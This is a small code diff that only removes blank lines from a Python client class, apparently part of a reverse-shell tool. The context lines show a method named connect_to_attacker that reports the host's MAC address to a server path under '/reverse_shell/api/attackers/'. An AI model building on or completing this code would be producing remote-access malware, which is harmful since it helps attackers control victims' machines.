@@ -24,8 +24,6 @@ class Client(object):
         # using regex expression
         return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
 
-
-
     def connect_to_attacker(self):
         response = requests.get(
             f'http://127.0.0.1:8000/reverse_shell/api/attackers/get_attacker/?mac_address={self.mac_address}')
